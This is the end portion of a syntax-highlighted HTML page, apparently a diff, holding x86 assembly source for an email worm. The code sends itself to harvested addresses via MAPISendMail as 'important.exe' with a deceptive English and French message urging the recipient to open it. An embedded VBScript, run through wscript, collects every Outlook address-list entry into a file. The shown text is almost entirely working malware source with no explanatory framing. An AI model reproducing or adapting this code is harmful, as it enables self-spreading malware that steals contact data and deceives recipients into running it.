+</span><span class="sc5">end_s3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkUnmapViewOfFile</span><span class="sc0">
+</span><span class="sc5">end_s2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkCloseHandle</span><span class="sc0">
+</span><span class="sc5">end_s1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkCloseHandle</span><span class="sc0">
+</span><span class="sc5">end_spread</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">
+
+</span><span class="sc5">end_worm</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
+
+</span><span class="sc5">send_mail</span><span class="sc4">:</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateDate</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateTime</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"C:\liste.ini"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_addr</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">date</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkWritePrivateProfileStringA</span><span class="sc0">
+
+    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Message</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">sess</span><span class="sc4">]</span><span class="sc0">
+    </span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">MAPISendMail</span><span class="sc0">
+    </span><span class="sc6">ret</span><span class="sc0">
+
+</span><span class="sc5">CreateDate</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
+    </span><span class="sc6">pushad</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">date</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">32</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"dddd, dd MMMM yyyy"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">9</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkGetDateFormatA</span><span class="sc0">
+    </span><span class="sc6">popad</span><span class="sc0">
+    </span><span class="sc6">ret</span><span class="sc0">
+</span><span class="sc5">CreateDate</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">
+</span><span class="sc5">CreateTime</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">
+    </span><span class="sc6">pushad</span><span class="sc0">
+    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">32</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
+    </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"HH:mm:ss"</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
+    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">9</span><span class="sc0">
+    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ptkGetTimeFormatA</span><span class="sc0">
+    </span><span class="sc6">popad</span><span class="sc0">
+    </span><span class="sc6">ret</span><span class="sc0">
+</span><span class="sc5">CreateTime</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">
+
+
+</span><span class="sc9">.data</span><span class="sc0">
+</span><span class="sc5">copy_worm</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">orig_worm</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">verif_worm</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">vbsfile</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">winpath</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">progra</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">mail_addr</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">realname</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">date</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">time</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
+</span><span class="sc5">octets</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">inet</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">sess</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
+
+</span><span class="sc5">subject</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Re: Check This..."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">body</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Hi"</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"This is the file you ask for. Open quickly ! It's very important"</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc3">"Best Regards"</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Salut,"</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Voici le fichier que tu cherches. Ouvre vite ! C'est très important"</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc3">"Mes sincères salutations"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">filename</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"important.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+
+</span><span class="sc5">Message</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">subject</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MsgFrom</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MsgTo</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Attach</span><span class="sc0">
+
+</span><span class="sc5">MsgFrom</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+
+</span><span class="sc5">MsgTo</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_addr</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_addr</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+
+</span><span class="sc5">Attach</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_worm</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">
+        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+
+</span><span class="sc5">szCloseHandle</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szCopyFileA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CopyFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szCreateDirectoryA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szCreateFileA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szCreateFileMappingA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szDeleteFileA</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DeleteFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szGetDateFormatA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetDateFormatA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szGetFileSize</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szGetModuleFileNameA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetModuleFileNameA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szGetSystemDirectoryA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szGetSystemTime</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetSystemTime"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szGetTimeFormatA</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetTimeFormatA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szGetWindowsDirectoryA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szlstrcat</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"lstrcat"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szlstrcmp</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"lstrcmp"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szlstrcpy</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"lstrcpy"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szlstrlen</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"lstrlen"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szMapViewOfFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szSetCurrentDirectoryA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szSleep</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Sleep"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szUnmapViewOfFile</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szWinExec</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WinExec"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szWriteFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WriteFile"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szWritePrivateProfileStringA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WritePrivateProfileStringA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+</span><span class="sc5">szWriteProfileStringA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WriteProfileStringA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+
+</span><span class="sc5">_ptkCloseHandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkCopyFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkCreateDirectoryA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkCreateFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkCreateFileMappingA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkDeleteFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkGetDateFormatA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkGetFileSize</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkGetModuleFileNameA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkGetSystemDirectoryA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkGetSystemTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkGetTimeFormatA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkGetWindowsDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptklstrcat</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptklstrcmp</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptklstrcpy</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptklstrlen</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkMapViewOfFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkSetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkSleep</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkUnmapViewOfFile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkWinExec</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkWriteFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkWriteProfileStringA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+</span><span class="sc5">_ptkWritePrivateProfileStringA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
+
+</span><span class="sc5">s_vbs</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'On Error Resume Next'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set f=CreateObject("Scripting.FileSystemObject")'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set win=f.GetSpecialFolder(0)'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set c=f.CreateTextFile(win&amp;"\Outlook_Addr.txt")'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'c.Close'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set out=CreateObject("Outlook.Application")'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set mapi=out.GetNameSpace("MAPI")'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'adr="extractcounter@multimania.com"'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'For Each mail in mapi.AddressLists'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'If mail.AddressEntries.Count &lt;&gt; 0 Then'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'For O=1 To mail.AddressEntries.Count'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'adr=adr &amp;";"&amp; mail.AddressEntries(O).Address'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Next'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'End If'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Next'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'adr=adr &amp;";#"'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Set c=f.OpenTextFile(win&amp;"\Outlook_Addr.txt",2)'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'c.WriteLine adr'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'c.Close'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
+</span><span class="sc5">e_vbs</span><span class="sc4">:</span><span class="sc0">
+
+</span><span class="sc5">execcontrol</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"wscript "</span><span class="sc0">
+        </span><span class="sc5">vbsexec</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
+        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">""</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
+
+</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start_worm</span><span class="sc0">
+</span><span class="sc5">end</span></div></body>
+</html>
